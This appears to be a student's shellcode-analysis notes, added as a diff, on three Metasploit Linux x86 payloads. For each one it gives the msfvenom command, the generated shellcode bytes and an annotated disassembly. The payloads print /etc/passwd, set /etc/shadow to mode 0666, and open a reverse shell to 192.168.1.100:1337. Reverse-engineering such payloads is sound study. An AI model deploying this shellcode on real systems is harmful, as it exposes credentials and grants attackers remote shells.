@@ -1,0 +1,133 @@
+Metasploit payloads:
+
+linux/x86/read_file
+
+root@kali:~# msfvenom -p linux/x86/read_file PATH=/etc/passwd -f c
+[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
+[-] No arch selected, selecting arch: x86 from the payload
+No encoder or badchars specified, outputting raw payload
+Payload size: 73 bytes
+Final size of c file: 331 bytes
+unsigned char buf[] = 
+"\xeb\x36\xb8\x05\x00\x00\x00\x5b\x31\xc9\xcd\x80\x89\xc3\xb8"
+"\x03\x00\x00\x00\x89\xe7\x89\xf9\xba\x00\x10\x00\x00\xcd\x80"
+"\x89\xc2\xb8\x04\x00\x00\x00\xbb\x01\x00\x00\x00\xcd\x80\xb8"
+"\x01\x00\x00\x00\xbb\x00\x00\x00\x00\xcd\x80\xe8\xc5\xff\xff"
+"\xff\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64\x00";
+
+SCREENSHOT IN SLAE folder
+
+/ (fcn) fcn.00000000 20
+|   fcn.00000000 ();
+|       ,=< 0x00000000      jmp 0x38 ; jmp to set up /etc/passwd
+/ (fcn) fcn.00000002 72
+|   fcn.00000002 ();
+|       |   0x00000002      mov eax, 5 ; sys_open
+|       |   0x00000007      pop ebx ; address of "/etc/passwd"
+|       |   0x00000008      xor ecx, ecx ; null out ECX
+|       |   0x0000000a      int 0x80 ; sys_open - returns file descriptor for file
+|       |   0x0000000c      mov ebx, eax ; move file descriptor into ebx
+|       |   0x0000000e      mov eax, 3 ; sys_read
+|       |   0x00000013      mov edi, esp ; moves stack pointer into edi
+|       |   0x00000015      mov ecx, edi ; moves stack pointer into ecx
+|       |   0x00000017      mov edx, 0x1000 ; size_t count: 4096 bytes max
+|       |   0x0000001c      int 0x80 ; sys_read - attempts to read 4096 bytes onto the stack and returns the number of bytes read
+|       |   0x0000001e      mov edx, eax ; number of read bytes => size_t count
+|       |   0x00000020      mov eax, 4 ; sys_write
+|       |   0x00000025      mov ebx, 1 ; 0x1 stdout
+|       |   0x0000002a      int 0x80 ; sys_write - write EDX number of bytes from the stack to stdout
+|       |   0x0000002c      mov eax, 1 ; sys_exit
+|       |   0x00000031      mov ebx, 0 ; 0x0 error code
+|       |   0x00000036      int 0x80 ; sys_exit
+|       `-> 0x00000038      call 2 ; call part of jmp-call-pop
+|           0x0000003d      das    ; /etc/passwd
+
+
+linux/x86/chmod
+
+root@kali:~# msfvenom -p linux/x86/chmod -f c
+[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
+[-] No arch selected, selecting arch: x86 from the payload
+No encoder or badchars specified, outputting raw payload
+Payload size: 36 bytes
+Final size of c file: 177 bytes
+unsigned char buf[] = 
+"\x99\x6a\x0f\x58\x52\xe8\x0c\x00\x00\x00\x2f\x65\x74\x63\x2f"
+"\x73\x68\x61\x64\x6f\x77\x00\x5b\x68\xb6\x01\x00\x00\x59\xcd"
+"\x80\x6a\x01\x58\xcd\x80";
+
+/ (fcn) fcn.00000000 36
+|   fcn.00000000 ();
+|           0x00000000      cdq    ; sets EDX 0 if EAX is positive
+|           0x00000001      push 0xf ; 15 ; 15 - sys_chmod
+|           0x00000003      pop eax ; sys_chmod
+|           0x00000004      push edx ; push 0x0
+|           0x00000005      call 0x16 ; pushes /etc/shadow address on the stack
+|           0x0000000a      das    ; /etc/shadow
+|       ,=< 0x0000000b      je 0x71 ; data
+|       |   0x0000000e      das    ; data
+|      ,==< 0x0000000f      jae 0x79 ; data
+|      ||   0x00000011      popal  ; data
+|      ||   0x00000012           .byte 0x64 ; data
+|      ||   0x00000013      outsd dx, dword [esi] ; data
+|      ||   0x00000014      ja 0x16 ; data
+|      ||   0x00000016      pop ebx ; pops /etc/shadow address into ebx
+|      ||   0x00000017      push 0x1b6 ; 438 ; octal 0666
+|      ||   0x0000001c      pop ecx ; mode_t mode
+|      ||   0x0000001d      int 0x80 ; sys_chmod
+|      ||   0x0000001f      push 1 ; 1 ; sys_exit
+|      ||   0x00000021      pop eax ; sys_exit => eax
+\      ||   0x00000022      int 0x80 ; sys_exit
+
+
+linux/x86/shell_reverse_tcp 
+
+root@kali:~# msfvenom -p linux/x86/shell_reverse_tcp -f c LHOST=192.168.1.100 LPORT=1337
+[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
+[-] No arch selected, selecting arch: x86 from the payload
+No encoder or badchars specified, outputting raw payload
+Payload size: 68 bytes
+Final size of c file: 311 bytes
+unsigned char buf[] = 
+"\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\x89\xe1\xb0\x66\xcd\x80"
+"\x93\x59\xb0\x3f\xcd\x80\x49\x79\xf9\x68\xc0\xa8\x01\x64\x68"
+"\x02\x00\x05\x39\x89\xe1\xb0\x66\x50\x51\x53\xb3\x03\x89\xe1"
+"\xcd\x80\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3"
+"\x52\x53\x89\xe1\xb0\x0b\xcd\x80";
+
+/ (fcn) fcn.00000000 68
+|   fcn.00000000 ();
+|           0x00000000      xor  ebx, ebx ; EBX = 0x00
+|           0x00000002      mul  ebx ; EBX * EAX => EAX = 0x00
+|           0x00000004      push ebx ; any protocol
+|           0x00000005      inc  ebx ; 0x1 - SYS_SOCKET
+|           0x00000006      push ebx ; 0x1 SOCK_STREAM
+|           0x00000007      push 2 ; 2 ; 0x2 AF_INET
+|           0x00000009      mov  ecx, esp ; call args
+|           0x0000000b      mov  al, 0x66 ; 'f' ; 102 ; sys_socketcall
+|           0x0000000d      int  0x80 ; SYS_SOCKETCALL -> SYS_SOCKET
+|           0x0000000f      xchg eax, ebx ; move file descriptor into EBX
+|           0x00000010      pop  ecx ;  call args
+|       .-> 0x00000011      mov  al, 0x3f ; '?' ; 63 ; dup2
+|       :   0x00000013      int  0x80 ; SYS_DUP2
+|       :   0x00000015      dec  ecx ; 0x2 - stderr, 0x1 - stdout, 0x0 - stdin
+|       `=< 0x00000016      jns  0x11 ; jmp if sign is positive
+|           0x00000018      push 0x6401a8c0 ; 100 1 168 192 (decimal)
+|           0x0000001d      push 0x39050002 ; 0x3905 - 1337 0x0 0x2 - AF_INET
+|           0x00000022      mov  ecx, esp ; function args
+|           0x00000024      mov  al, 0x66 ; 'f' ; 102 ; SYS_SOCKETCALL
+|           0x00000026      push eax ; 0x1
+|           0x00000027      push ecx ; function args
+|           0x00000028      push ebx ; file descriptor
+|           0x00000029      mov  bl, 3 ; 0x3 - SYS_CONNECT
+|           0x0000002b      mov  ecx, esp
+|           0x0000002d      int  0x80 ; SYS_SOCKETCALL -> SYS_CONNECT
+|           0x0000002f      push edx ; 0x0
+|           0x00000030      push 0x68732f6e ; 'n/sh'
+|           0x00000035      push 0x69622f2f ; '//bi'
+|           0x0000003a      mov  ebx, esp ; //bin/sh0x00
+|           0x0000003c      push edx ; 0x0
+|           0x0000003d      push ebx ; file descriptor
+|           0x0000003e      mov  ecx, esp ; address of //bin/sh, 0x00
+|           0x00000040      mov  al, 0xb ; 11 ; SYS_EXECVE
+\           0x00000042      int  0x80 ; SYS_EXECVE //bin/sh
